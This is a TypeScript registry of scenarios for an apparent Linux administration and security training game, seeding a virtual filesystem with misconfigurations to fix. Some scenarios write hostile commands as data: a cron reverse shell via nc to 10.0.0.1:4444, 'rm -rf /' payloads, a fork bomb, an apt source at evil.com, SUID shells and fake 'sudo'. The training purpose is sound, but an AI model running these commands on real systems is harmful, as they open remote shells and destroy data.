import { VFS } from '../vfs/vfs';
import type { Logger } from '../../types/logger';

export type ScenarioInitializer = (vfs: VFS, logger: Logger) => Promise<void>;

/**
 * Apply a scenario or a composite of scenarios by ID.
 * Supports chaining multiple scenarios via the 'mastery_composite' pattern.
 */
export async function applyScenario(vfs: VFS, scenarioId: string, logger: Logger = console as any): Promise<void> {
    const initializer = ScenarioRegistry[scenarioId];
    if (!initializer) {
        logger.warn(`Scenario "${scenarioId}" not found in registry.`);
        return;
    }
    await initializer(vfs, logger);
}

export const ScenarioRegistry: Record<string, ScenarioInitializer> = {
    'permissions_nightmare': async (vfs, logger) => {
        const binaryPath = '/usr/bin/passwd';
        const shadowPath = '/etc/shadow';

        // MANDATORY: Use numeric octal literals for chmod
        // 0o755 removes SUID bit if it was 4755
        await vfs.chmod(binaryPath, 0o755); 
        // 0o644 makes shadow world-readable
        await vfs.chmod(shadowPath, 0o644); 
        
        logger.info('Scenario "Permissions Nightmare" applied: SUID removed from passwd, shadow made 644.');
    },

    'circular_link': async (vfs, logger) => {
        const userHome = '/home/user';
        const backupDir = `${userHome}/backup`;
        const archiveDir = `${backupDir}/archive`;

        // Create structure
        await vfs.mkdir('/home', 'user', 'root');
        await vfs.mkdir(userHome, 'backup', 'user');
        await vfs.mkdir(backupDir, 'archive', 'user');

        // MANDATORY: Use symlink(target, linkpath) signature
        // Creating a circular reference or just a link as requested
        await vfs.symlink('../', `${archiveDir}/latest`);

        logger.info('Scenario "Circular Link" applied: Symlink created at archive/latest pointing to ../');
    },

    'ghost_log': async (vfs, logger) => {
        // Prepare a scenario where a log file is "missing" but takes space
        await vfs.mkdir('/var', 'log', 'root');
        const logPath = '/var/log/apache2.log';
        await vfs.writeFile(logPath, 'A'.repeat(1024 * 1024), 'root'); // 1MB log
        
        // In a real system, we'd delete it while a process holds the handle.
        // For now, we just corrupt it.
        await vfs.chmod(logPath, 0o000); 
        logger.info('Scenario "Ghost Log" applied: Process log corrupted with 000 permissions.');
    },

    'suid_shell_leak': async (vfs, logger) => {
        // A common security lab: find and fix a world-writable SUID shell
        await vfs.mkdir('/usr', 'local/bin', 'root');
        const shellPath = '/usr/local/bin/backdoor';
        await vfs.writeFile(shellPath, '#!/bin/sh\nexec /bin/sh', 'root');
        await vfs.chmod(shellPath, 0o4777); // World-writable SUID!
        logger.info('Scenario "SUID Shell Leak" applied: Writable SUID backdoor created at /usr/local/bin/backdoor.');
    },

    'sticky_bit_missing': async (vfs, logger) => {
        // Sticky bit missing on /tmp
        await vfs.mkdir('/', 'tmp', 'root');
        await vfs.chmod('/tmp', 0o777); // Missing 1777!
        logger.info('Scenario "Sticky Bit Missing" applied: /tmp is now 777 (vulnerable).');
    },

    'corrupt_passwd_format': async (vfs, logger) => {
        // /etc/passwd missing a field
        const corruptPasswd = 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user::/bin/bash'; // broken home/shell
        await vfs.writeFile('/etc/passwd', corruptPasswd, 'root');
        logger.info('Scenario "Corrupt Passwd Format" applied: user entry in /etc/passwd is malformed.');
    },

    'broken_symlink_chain': async (vfs, logger) => {
        // a chain of 5 symlinks ending in a missing file
        await vfs.mkdir('/etc', 'config', 'root');
        await vfs.symlink('/etc/config/target', '/etc/config/link1');
        await vfs.symlink('/etc/config/link1', '/etc/config/link2');
        await vfs.symlink('/etc/config/link2', '/etc/config/link3');
        await vfs.symlink('/etc/config/link3', '/etc/config/link4');
        await vfs.symlink('/etc/config/link4', '/etc/config/final');
        // target is missing
        logger.info('Scenario "Broken Symlink Chain" applied: Chain at /etc/config/final pointing to missing target.');
    },

    'path_hijack': async (vfs, logger) => {
        // Hijack common command by putting a fake one in /usr/local/bin
        await vfs.mkdir('/usr/local', 'bin', 'root');
        const fakeLs = '/usr/local/bin/ls';
        await vfs.writeFile(fakeLs, '#!/bin/sh\necho "You have been pwned!"', 'root');
        await vfs.chmod(fakeLs, 0o755);
        logger.info('Scenario "Path Hijack" applied: Fake "ls" created in /usr/local/bin.');
    },

    'ssh_key_security': async (vfs, logger) => {
        // SSH private key with too broad permissions
        await vfs.mkdir('/home/user', '.ssh', 'user');
        const keyPath = '/home/user/.ssh/id_rsa';
        await vfs.writeFile(keyPath, '-----BEGIN RSA PRIVATE KEY-----\n...', 'user');
        await vfs.chmod(keyPath, 0o644); // Should be 600
        logger.info('Scenario "SSH Key Security" applied: SSH private key made world-readable.');
    },

    'too_many_logs': async (vfs, logger) => {
        // Simulation of log spam
        await vfs.mkdir('/var', 'log/huge', 'root');
        for (let i = 1; i <= 5; i++) {
            await vfs.writeFile(`/var/log/huge/spam.${i}.log`, 'ERROR '.repeat(5000), 'root');
        }
        logger.info('Scenario "Too Many Logs" applied: Created 5 large spam logs in /var/log/huge.');
    },

    'mastery_admin_challenge': async (vfs, logger) => {
        // Chaining multiple corruptions for an endgame mastery challenge
        await applyScenario(vfs, 'permissions_nightmare', logger);
        await applyScenario(vfs, 'path_hijack', logger);
        await applyScenario(vfs, 'ghost_log', logger);
        logger.info('Mastery Challenge "Admin Nightmare" applied: Composite of Permissions, Hijack, and Ghost Logs.');
    },

    // ----------------------------------------------------------------------
    // ARENA SCENARIOS
    // ----------------------------------------------------------------------

    'arena_ghost_process': async (vfs, logger) => {
        // Simulated process that needs killing. The engine will handle process creation if applicable,
        // but for VFS tests, we could just create a mock pid file.
        await vfs.mkdir('/var/run', 'rogue', 'root');
        await vfs.writeFile('/var/run/rogue/rogue_daemon.pid', '9999', 'root');
        logger.info('Arena: ghost process PID written.');
    },

    'arena_hidden_secrets': async (vfs, logger) => {
        await vfs.writeFile('/home/user/.launch_codes', '8493-2941-0000-X', 'user');
        logger.info('Arena: hidden launch codes planted in user home.');
    },

    'arena_permission_cascade': async (vfs, logger) => {
        await vfs.mkdir('/var', 'www', 'root');
        await vfs.writeFile('/var/www/index.html', '<html>Welcome</html>', 'root');
        await vfs.chmod('/var/www', 0o000);
        await vfs.chmod('/var/www/index.html', 0o000);
        logger.info('Arena: /var/www locked down.');
    },

    'arena_log_truncator': async (vfs, logger) => {
        await vfs.mkdir('/var', 'log', 'root');
        await vfs.writeFile('/var/log/syslog', 'LOG ENTRY\n'.repeat(100), 'root');
        logger.info('Arena: large syslog created.');
    },

    'arena_orphaned_symlink': async (vfs, logger) => {
        await vfs.symlink('/usr/share/zoneinfo/Mars/City', '/etc/localtime');
        logger.info('Arena: broken symlink created for localtime.');
    },

    'arena_locked_out': async (vfs, logger) => {
        await vfs.writeFile('/etc/motd', 'Welcome to Ashborn', 'root');
        await vfs.chmod('/etc/motd', 0o600);
        logger.info('Arena: motd locked to root-only.');
    },

    'arena_network_hijack': async (vfs, logger) => {
        await vfs.writeFile('/etc/hosts', '192.168.1.100 localhost\n', 'root');
        logger.info('Arena: localhost hijacked in /etc/hosts.');
    },

    'arena_empty': async (vfs, logger) => {
        logger.info('Arena: empty scenario ready.');
    },

    'arena_archive': async (vfs, logger) => {
        await vfs.writeFile('/home/user/update.tar', 'FAKE TAR CONTENT', 'user');
        logger.info('Arena: update.tar dropped in user home.');
    },

    'arena_profile_fix': async (vfs, logger) => {
        await vfs.writeFile('/etc/profile', 'export PATH=/wrong:/paths', 'root');
        logger.info('Arena: broken /etc/profile created.');
    },

    'arena_corrupt_fs': async (vfs, logger) => {
        await vfs.mkdir('/', 'lib', 'root');
        await vfs.writeFile('/lib/libc.so.6', 'ELF DATA', 'root');
        logger.info('Arena: libc.so missing symlink setup.');
    },

    'arena_sticky_missing': async (vfs, logger) => {
        await vfs.mkdir('/', 'tmp', 'root');
        await vfs.chmod('/tmp', 0o777);
        logger.info('Arena: /tmp missing sticky bit.');
    },

    'arena_rogue_suid': async (vfs, logger) => {
        await vfs.mkdir('/usr/share', 'nmap', 'root');
        await vfs.writeFile('/usr/share/nmap', '#!/bin/sh\n/bin/sh -p', 'root');
        await vfs.chmod('/usr/share/nmap', 0o4755);
        logger.info('Arena: Rogue SUID binary planted at /usr/share/nmap.');
    },

    'arena_hidden_miners': async (vfs, logger) => {
        await vfs.mkdir('/var', 'tmp', 'root');
        await vfs.writeFile('/var/tmp/.miner.sh', 'while true; do compute; done', 'user');
        logger.info('Arena: hidden miner planted.');
    },

    'arena_immutable_config': async (vfs, logger) => {
        await vfs.writeFile('/etc/resolv.conf', 'nameserver 8.8.8.8', 'root');
        await vfs.chmod('/etc/resolv.conf', 0o644);
        logger.info('Arena: resolv.conf created with 644.');
    },

    'arena_group_collab': async (vfs, logger) => {
        await vfs.mkdir('/', 'opt', 'root');
        logger.info('Arena: /opt directory ready for collab setup.');
    },

    'arena_passwd_recovery': async (vfs, logger) => {
        await vfs.chmod('/usr/bin/passwd', 0o755);
        logger.info('Arena: /usr/bin/passwd stripped of SUID.');
    },

    'arena_zombie_cleanup': async (vfs, logger) => {
        // Will be verified by engine processes, VFS setup empty
        logger.info('Arena: zombie cleanup init.');
    },

    'arena_safe_exec': async (vfs, logger) => {
        await vfs.writeFile('/home/user/payload.sh', 'rm -rf /', 'user');
        await vfs.chmod('/home/user/payload.sh', 0o755);
        logger.info('Arena: executable payload dropped.');
    },

    'arena_broken_bootloader': async (vfs, logger) => {
        await vfs.mkdir('/', 'boot', 'root');
        await vfs.writeFile('/boot/vmlinuz-5.15.0-generic', 'KERNEL DATA', 'root');
        await vfs.symlink('/boot/vmlinuz-old', '/boot/vmlinuz');
        logger.info('Arena: broken bootloader link created.');
    },

    'arena_kernel_panic': async (vfs, logger) => {
        await vfs.mkdir('/etc', 'modprobe.d', 'root');
        await vfs.writeFile('/etc/modprobe.d/blacklist.conf', 'blacklist everything', 'root');
        logger.info('Arena: kernel panic blacklist created.');
    },

    'arena_path_hijack': async (vfs, logger) => {
        await vfs.mkdir('/usr', 'local', 'root');
        await vfs.mkdir('/usr/local', 'bin', 'root');
        await vfs.writeFile('/usr/local/bin/sudo', '#!/bin/sh\necho PWNED', 'root');
        await vfs.chmod('/usr/local/bin/sudo', 0o755);
        logger.info('Arena: path hijack sudo planted.');
    },

    'arena_deep_recursion': async (vfs, logger) => {
        await vfs.mkdir('/var', 'lib', 'root');
        await vfs.mkdir('/var/lib', 'data', 'root');
        await vfs.symlink('/var/lib/data', '/var/lib/data/link');
        logger.info('Arena: deep recursion link created.');
    },

    'arena_shadow_exfil': async (vfs, logger) => {
        await vfs.writeFile('/tmp/shadow.backup', 'root:$6$...', 'user');
        logger.info('Arena: shadow backup exfil planted.');
    },

    'arena_process_starvation': async (vfs, logger) => {
        logger.info('Arena: process starvation initialized.');
    },

    'arena_ssh_hardening': async (vfs, logger) => {
        await vfs.mkdir('/etc', 'ssh', 'root');
        await vfs.writeFile('/etc/ssh/sshd_config', 'Port 22\n', 'user');
        await vfs.chmod('/etc/ssh/sshd_config', 0o777);
        logger.info('Arena: vulnerable sshd_config created.');
    },

    'arena_env_pollution': async (vfs, logger) => {
        await vfs.writeFile('/root/.bashrc', 'alias ls="rm -rf /"\n', 'root');
        logger.info('Arena: environment pollution planted.');
    },

    'arena_cron_escapade': async (vfs, logger) => {
        await vfs.mkdir('/etc', 'cron.d', 'root');
        await vfs.writeFile('/etc/cron.d/reverse_shell', '* * * * * root /bin/nc -e /bin/sh 10.0.0.1 4444', 'root');
        logger.info('Arena: rogue cron job created.');
    },

    'arena_lost_binaries': async (vfs, logger) => {
        await vfs.mkdir('/tmp', 'bin', 'root');
        logger.info('Arena: /tmp/bin created, simulating lost binaries.');
    },

    'arena_master_sysadmin': async (vfs, logger) => {
        await vfs.writeFile('/usr/bin/hack', 'hacked', 'root');
        await vfs.chmod('/usr/bin/hack', 0o4755);
        await vfs.chmod('/etc/shadow', 0o666);
        logger.info('Arena: master sysadmin chaos unleashed.');
    },

    'arena_zero_day': async (vfs, logger) => {
        await vfs.chmod('/usr/bin/curl', 0o755);
        logger.info('Arena: curl exposed for zero day.');
    },

    'arena_empty_systemd': async (vfs, logger) => {
        await vfs.mkdir('/etc/systemd', 'system', 'root');
        logger.info('Arena: empty systemd target ready.');
    },

    'arena_chroot_escape': async (vfs, logger) => {
        await vfs.mkdir('/', 'jail', 'root');
        await vfs.writeFile('/jail/flag.txt', 'CTF_FLAG{escaped}', 'root');
        logger.info('Arena: chroot flag planted.');
    },

    'arena_apt_poison': async (vfs, logger) => {
        await vfs.mkdir('/etc', 'apt', 'root');
        await vfs.writeFile('/etc/apt/sources.list', 'deb http://evil.com/ubuntu focal main\n', 'root');
        logger.info('Arena: apt sources poisoned.');
    },

    'arena_fs_wipe': async (vfs, logger) => {
        await vfs.mkdir('/', 'data', 'root');
        await vfs.writeFile('/data/secret1', 'data1', 'root');
        await vfs.writeFile('/data/secret2', 'data2', 'root');
        logger.info('Arena: data directory ready to be wiped.');
    },

    'arena_empty_hosts': async (vfs, logger) => {
        await vfs.writeFile('/etc/hosts', '127.0.0.1 localhost\n', 'root');
        logger.info('Arena: hosts file ready for sinkhole.');
    },

    'arena_firewall_lockout': async (vfs, logger) => {
        await vfs.mkdir('/etc', 'ufw', 'root');
        await vfs.writeFile('/etc/ufw/rules', 'DENY 22\n', 'root');
        logger.info('Arena: ufw blocking ssh.');
    },

    'arena_fork_bomb': async (vfs, logger) => {
        await vfs.writeFile('/tmp/bomb.sh', ':(){ :|:& };:', 'user');
        logger.info('Arena: fork bomb planted.');
    },

    'arena_rootkit': async (vfs, logger) => {
        await vfs.mkdir('/lib', 'modules', 'root');
        await vfs.writeFile('/lib/modules/evil.ko', 'ROOTKIT DATA', 'root');
        logger.info('Arena: kernel rootkit loaded.');
    }
};
